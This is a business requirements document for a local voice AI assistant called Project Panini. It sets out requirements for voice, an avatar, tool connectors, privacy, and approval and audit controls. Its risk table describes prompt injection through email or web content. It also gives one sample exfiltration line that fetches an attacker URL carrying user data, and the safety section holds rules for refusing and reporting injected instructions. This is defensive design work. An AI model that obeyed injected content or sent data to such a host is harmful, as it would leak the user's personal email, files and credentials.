# Project Panini — Business Requirements Document (BRD)

**Document Type:** Business Requirements  
**Phase:** 01 — BRD  
**Version:** 1.0  
**Status:** DRAFT — awaiting review  
**Date:** 2026-09-09  
**Owner:** Project Owner  

---

## Document Control

| Version | Date | Author | Change |
|---|---|---|---|
| 1.0 | 2026-09-09 | Project Owner + Claude | Initial draft |

### Related Documents

| Document | Purpose |
|---|---|
| `00_Discovery/01_Project_Charter/01_Problem_Statement_and_Vision.md` | Problem definition and vision |
| `00_Discovery/02_Naming_and_Identity/01_Project_Naming_Research.md` | Name and identity rationale |
| `00_Discovery/03_OSS_Research/01_OSS_Repository_Analysis.md` | Component sourcing analysis |
| `00_Discovery/04_Design_Decisions/02_Decision_Register.md` | **Source of truth for all decisions (DD-IDs)** |
| `00_Discovery/04_Design_Decisions/03_License_Audit.md` | Licence compliance constraints |
| `00_Discovery/04_Design_Decisions/05_Hardware_Validation_Results.md` | Measured performance baselines |
| `00_Discovery/05_Security/01_Threat_Model.md` | Threat analysis and required security controls |

### A note on sequencing

Discovery preceded this document, so a number of design decisions are already baselined in the Decision Register. **This BRD does not re-open them.** It states the business need; where a need has already been answered by a locked decision, the decision ID is cited. Requirements introducing anything *not* already covered are marked **NEW** and must be added to the register before design proceeds.

---

## 1. Executive Summary

Project Panini is a **local-first, single-user AI personal assistant** with voice interaction, an animated avatar, context-aware visual output, and integration into the user's everyday tools (email, calendar, files, web).

Its distinguishing characteristic is that it delivers a capable conversational assistant **without sending the user's personal data to a third party**. Empirical validation on the target hardware confirms this is achievable: an end-to-end spoken response in approximately **1.8–2.2 seconds**, entirely on-device.

**Business value:** the user gains an assistant that can act across their personal tools — reading email, checking calendars, running commands, retrieving information — while retaining full ownership and custody of the data involved.

---

## 2. Business Context

### 2.1 The problem

Existing assistants force a trade-off between capability and privacy:

| Category | Capability | Privacy | Extensible |
|---|---|---|---|
| Cloud assistants (ChatGPT, Gemini) | High | ❌ Data leaves the device | Limited |
| Platform assistants (Siri, Alexa, Cortana) | Moderate | ❌ Vendor-controlled | ❌ Closed |
| Smart-home hubs (Home Assistant) | Narrow domain | ✅ Local | ✅ Yes |
| Existing open-source assistants | Partial — each strong in one area only | ✅ Local | Varies |

No available option combines voice interaction, visual presence, deep tool integration, extensibility, and local privacy in one system.

### 2.2 Why now

Three enablers have matured concurrently:

1. **Capable small models** — 7B-class models now deliver useful reasoning on consumer GPUs (validated: 35.26 tok/s, DD-104).
2. **Fast local speech** — Whisper-class STT and Kokoro-class TTS run acceptably on CPU (validated: 0.75 s and 0.31–0.70 s respectively).
3. **Mature open-source components** — proven modules exist for voice, avatar, and tooling, removing the need to build from scratch (DD-005).

### 2.3 Business drivers

| Driver | Description |
|---|---|
| **Data sovereignty** | Personal email, calendar, and files must not be transmitted to third-party AI services. |
| **Capability** | The assistant must *act*, not merely converse. |
| **Ownership** | No dependency on a vendor's continued service, pricing, or terms. |
| **Personalisation** | Adaptable to the individual's tools, habits, and preferences. |

---

## 3. Stakeholders

| Stakeholder | Role | Interest |
|---|---|---|
| **Project Owner** | Sole user, sponsor, and developer | Delivery of a usable daily assistant |
| **Future contributors** | Potential open-source contributors | Clear architecture; unencumbered licensing |
| **Upstream OSS projects** | Component sources | Correct attribution and licence compliance |

**Note:** Panini is explicitly a **single-user** system (DD-004, DX-001). There is no second user class in v1.

---

## 4. Business Objectives

| ID | Objective | Measure of Success |
|---|---|---|
| **BO-1** | Provide a voice-driven assistant usable in daily work | Used at least once daily over a sustained period |
| **BO-2** | Keep all personal data on the user's machine | Zero personal data transmitted when in local mode |
| **BO-3** | Enable the assistant to act on the user's behalf | ≥ 6 working connectors at launch (DD-051) |
| **BO-4** | Deliver conversational responsiveness | End-to-end response ≤ 3 s (validated: ~1.8–2.2 s) |
| **BO-5** | Remain extensible without core changes | New capability addable via plugin, no core edit (DD-070) |
| **BO-6** | Avoid legal or licensing encumbrance | No copyleft obligations (DD-074) |

---

## 5. Business Requirements

Priority: **M** = Must have (v1) · **S** = Should have (v1 if feasible) · **C** = Could have (v2) · **W** = Won't have (out of scope)

### 5.1 Interaction

| ID | Requirement | Priority | Traces to |
|---|---|---|---|
| **BR-001** | The user shall be able to interact with the assistant by speaking, without using a keyboard. | M | DD-020, DD-022, DD-027 |
| **BR-002** | The assistant shall activate on a spoken wake phrase without requiring a button press. | M | DD-002, DD-025 |
| **BR-003** | The user shall be able to interrupt the assistant mid-response by speaking. | M | DD-027 |
| **BR-004** | The assistant shall understand natural, conversational phrasing rather than fixed commands. | M | DD-040 |
| **BR-005** | The user shall be able to interact by typing, with full capability parity to speech. | **M** | DD-035 |
| **BR-006** | The assistant shall retain context across turns within a conversation. | M | DD-103, DO-002 |

### 5.2 Presence and Presentation

| ID | Requirement | Priority | Traces to |
|---|---|---|---|
| **BR-007** | The assistant shall present a visible animated character that reacts to conversation. | M | DD-030, DD-033 |
| **BR-008** | The character shall lip-sync to spoken output and express emotional state. | M | DD-033 |
| **BR-009** | The assistant shall remain visible on the desktop without occupying a full window. | S | DD-034 |
| **BR-010** | Results shall be presented in a form appropriate to their content — code, images, video, data, diagrams, or plain text. | M | DD-080, DD-081 |
| **BR-011** | The user shall be able to select the character's appearance. | S | DD-032 |
| **BR-012** | The user shall be able to select the assistant's personality/persona. | C | DD-073 |

### 5.3 Capability and Integration

| ID | Requirement | Priority | Traces to |
|---|---|---|---|
| **BR-013** | The assistant shall read and compose email on the user's behalf. | M | DD-051 |
| **BR-014** | The assistant shall read and create calendar entries. | M | DD-051 |
| **BR-015** | The assistant shall retrieve current information from the web. | M | DD-051 |
| **BR-016** | The assistant shall read and write files on the local machine. | M | DD-051 |
| **BR-017** | The assistant shall execute system commands when instructed. | M | DD-051 |
| **BR-018** | The assistant shall automate browser actions when instructed. | S | DD-051 |
| **BR-019** | The assistant shall generate images on request. | C | DD-051 |
| **BR-020** | The assistant shall connect to external tool servers via a standard protocol. | S | DD-053 |
| **BR-021** | The assistant shall be reachable through messaging channels (Telegram, WhatsApp, Discord, Slack). | W | DD-052 — deferred to v2 |

### 5.4 Privacy and Data Ownership

| ID | Requirement | Priority | Traces to |
|---|---|---|---|
| **BR-022** | The assistant shall operate fully without an internet connection in its default configuration. | M | DD-004, DD-041 |
| **BR-023** | Personal data shall not be transmitted to third parties unless the user explicitly selects a cloud model. | M | DD-004, DD-041 |
| **BR-024** | The user shall be able to see which model provider is in use at any time, and shall explicitly acknowledge any switch from local to cloud. | M | DD-113 |
| **BR-025** | Credentials shall be stored encrypted and shall not be recoverable from a backup copied to another machine. | M | DD-066 |
| **BR-026** | The user shall be able to review a record of every action the assistant has taken. | M | DD-065 |

### 5.5 Safety and Control

| ID | Requirement | Priority | Traces to |
|---|---|---|---|
| **BR-027** | Actions that modify or delete data shall require explicit user approval before execution. | M | DD-060, DD-062, DD-063, DD-064 |
| **BR-028** | Read-only actions shall execute without interrupting the user for approval. | M | DD-061 |
| **BR-029** | The user shall be able to disable any individual capability. | M | DD-070 |
| **BR-030** | The assistant shall not act on instructions found within content it retrieves (email bodies, web pages, documents). | M | DD-110, DD-111 |
| **BR-030a** | After reading untrusted content, any action that modifies data or sends it off-machine shall require explicit approval for the remainder of that turn. | M | DD-111 |
| **BR-030b** | Before any data leaves the machine, the user shall be shown the destination and a preview of what is being sent. | M | DD-112 |
| **BR-030c** | The assistant shall report instructions found inside retrieved content to the user rather than following them. | M | DD-110 |

### 5.6 Flexibility

| ID | Requirement | Priority | Traces to |
|---|---|---|---|
| **BR-031** | The user shall be able to switch the underlying language model without reinstalling. | M | DD-040, DD-042 |
| **BR-032** | The user shall be able to choose between local and cloud models per their preference. | M | DD-041, DD-042 |
| **BR-033** | New capabilities shall be addable without modifying core code. | M | DD-070, DD-071 |
| **BR-034** | Configuration shall be editable in a single human-readable file. | S | DD-092 |

### 5.7 Availability and Performance

| ID | Requirement | Priority | Traces to |
|---|---|---|---|
| **BR-035** | The assistant shall remain available in the background when its window is closed. | M | DD-090, DD-091 |
| **BR-036** | The assistant shall begin an audible response within 3 seconds of the user finishing speaking. | M | Validated ≈1.8–2.2 s |
| **BR-037** | The assistant shall release GPU memory when idle so other applications are not starved. | M | DD-099 |
| **BR-038** | The assistant shall run on the target hardware without requiring an upgrade. | M | DD-095 — validated |

---

## 6. Success Criteria

### 6.1 Launch acceptance

Project Panini v1 is accepted when **all** of the following hold:

| # | Criterion | Verification |
|---|---|---|
| 1 | Spoken command → spoken answer works end-to-end | Manual walkthrough |
| 2 | Wake phrase activates reliably in a quiet room | ≥ 9 of 10 activations |
| 3 | All six v1 connectors function (BR-013 – BR-018) | Per-connector test |
| 4 | Each output type renders in its correct panel | One test per panel type |
| 5 | Destructive actions prompt for approval | Negative test per tier |
| 6 | System runs fully offline in default configuration | Network disconnected test |
| 7 | End-to-end response ≤ 3 s | Measured, 20-sample median |
| 8 | Assistant survives window close and remains wake-responsive | Manual test |
| 9 | Audit log records every tool execution | Log inspection |
| 10 | No AGPL-derived code present | Source audit against DD-074 |

### 6.2 Quality measures

| Measure | Target | Basis |
|---|---|---|
| Wake-word false-accept rate | ≤ 1 per 8 h idle | To be baselined (Test 8) |
| STT accuracy on ordinary commands | ≥ 90 % word accuracy | To be baselined |
| End-to-end response, median | ≤ 3 s | Validated ≈1.8–2.2 s composed |
| Peak VRAM | < 6,144 MiB | Validated 4,857 MiB |
| Unattended crash-free runtime | ≥ 8 h | To be baselined |

---

## 7. Scope

### 7.1 In scope — v1

- Voice interaction with wake word and interruption
- Animated 3D avatar with lip-sync and emotion
- Context-aware output panels
- Six connectors: email, calendar, web search, filesystem, shell, browser
- Local and cloud model support, switchable
- Tiered permission model with audit logging
- Plugin extensibility
- Background daemon with system-tray presence
- Windows desktop

### 7.2 Out of scope — v1

| Excluded | Rationale | Traces to |
|---|---|---|
| Multiple users / accounts | Single-user by design | DX-001 |
| Mobile application | Desktop-first | DX-002 |
| Cloud hosting / SaaS | Local-first; revisit post-v1 | DX-003 |
| Enterprise connectors (Salesforce, SAP…) | Personal-use focus | DX-004 |
| Real-time collaboration | Single-user | DX-005 |
| Public API for third-party developers | Not required for personal use | DX-006 |
| Messaging channel integrations | Deferred to v2 | DD-052 |
| macOS / Linux builds | Windows-first; portable by construction | DD-006 |

---

## 8. Assumptions

| ID | Assumption | Risk if false |
|---|---|---|
| **A-01** | The user operates primarily on the validated hardware (DD-095) | Performance targets may not hold |
| **A-02** | The machine is mains-powered during assistant use | Battery operation degrades inference |
| **A-03** | The user is comfortable granting the assistant access to email, calendar, and files | Core value proposition is reduced |
| **A-04** | English is the primary interaction language | Multilingual support is unvalidated |
| **A-05** | Ambient noise is moderate — a typical home or office room | Wake-word reliability degrades |
| **A-06** | The user accepts ~2–3 s response latency as conversational | Perceived quality falls |

---

## 9. Constraints

| ID | Constraint | Source |
|---|---|---|
| **C-01** | Discrete GPU memory limited to 6,144 MiB | DD-096 — validated |
| **C-02** | Local model limited to ~7B parameters at Q4 quantisation | DD-041, DD-104 |
| **C-03** | No code may be copied from AGPL-licensed sources | DD-074 |
| **C-04** | Live2D avatar path carries proprietary SDK terms | Licence Audit §5 |
| **C-05** | Single developer — effort is the primary delivery constraint | Project context |
| **C-06** | Sustained inference causes thermal throttling on laptop hardware | Hardware Feasibility §7 |

---

## 10. Dependencies

| ID | Dependency | Type | Risk |
|---|---|---|---|
| **D-01** | Ollama runtime | External software | Low — stable, self-hosted |
| **D-02** | Google API access (Gmail, Calendar) | External service | Medium — OAuth setup, quota |
| **D-03** | Upstream OSS components (MIT / Apache 2.0) | Source code | Low — licences verified |
| **D-04** | Web search provider | External service | Medium — API key, rate limits |
| **D-05** | VRM avatar model asset | Content | Low — freely available |

---

## 11. Risks

| ID | Risk | Impact | Likelihood | Mitigation |
|---|---|---|---|---|
| **R-01** | ~~Decision-ID collision — DD-100–105 used for both out-of-scope items and hardware decisions~~ | ~~Traceability breaks~~ | ✅ **RESOLVED 2026-09-09** | Exclusions renumbered to `DX-001–006`. Found during BRD drafting; fixed same day. |
| **R-02** | Assistant's own name mis-transcribes ("Panini" → "Ponyney") | Degraded UX | High | DO-007 — retest with human voice; `initial_prompt` biasing |
| **R-03** | Scope is large for a single developer | Delivery slips | High | Strict MoSCoW; ship Must-have set first |
| **R-04** | Prompt injection via email or web content | **Security breach** | **High** — requires only the user's email address | ✅ **Threat Model produced.** DD-110 (provenance), **DD-111 (taint tracking — enforced in code)**, DD-112 (egress control). Residual risk consciously accepted per DD-117. |
| **R-09** | Exfiltration disguised as retrieval (e.g. `fetch attacker.com/log?data=…`) | **Data loss** | Medium | DD-112 — egress classification independent of permission tier. Tier-based thinking alone does not catch this. |
| **R-05** | Reimplementing Sapphire-equivalent modules takes longer than the 3–5 day estimate | Delivery slips | Medium | Estimate is documented; re-baseline after first module |
| **R-06** | OAuth setup friction for Google connectors | Blocked features | Medium | Document setup; degrade gracefully if unconfigured |
| **R-07** | Renderer defaults onto discrete GPU, reclaiming 0.6 GB VRAM | Performance regression | Medium | DD-101 — pin integrated GPU explicitly |
| **R-08** | Thermal throttling during extended use | Degraded responsiveness | Medium | DD-099 idle unload; document mains-power expectation |

---

## 12. New Requirements Requiring Register Entries

Per the governance rule, requirements introducing decisions not already in the register must be added before design proceeds.

| BR | Requirement | Status |
|---|---|---|
| **BR-005** | Text input | ✅ **Resolved** — DD-035: full parity with voice |
| **BR-024** | Visible model provider | ✅ **Resolved** — DD-113 |
| **BR-030** | No action on instructions in retrieved content | ✅ **Resolved** — DD-110, DD-111, DD-112; full Threat Model produced |

---

## 13. Open Questions — Resolved

| # | Question | Resolution | Date |
|---|---|---|---|
| 1 | BR-005 — text input parity or fallback? | **Full parity** (DD-035). Cheaper than a parallel path, and required to test the pipeline without a microphone. | 2026-09-09 |
| 2 | BR-012 — personas priority? | **Confirmed Could-have.** Cheap to build but adds configuration surface; not core to v1 value. | 2026-09-09 |
| 3 | BR-019 — image generation in v1? | **Confirmed Could-have.** Requires ComfyUI or a cloud API; neither is core to the assistant's purpose. | 2026-09-09 |
| 4 | BO-1 — usage measure? | **Qualitative judgement.** A usage-count target on a single-user personal tool would be self-reported and gameable; the honest measure is whether the owner keeps using it. | 2026-09-09 |
| 5 | Threat model before FRD? | **Yes — produced.** See `00_Discovery/05_Security/01_Threat_Model.md`. Yielded 8 new decisions (DD-110–117) and 4 new requirements (BR-030a–c). | 2026-09-09 |

---

## 14. Approval

| Role | Name | Decision | Date |
|---|---|---|---|
| Project Owner | — | ☐ Approved ☐ Approved with changes ☐ Rejected | — |

**On approval, the next phase is `02_Solution_Design`.**
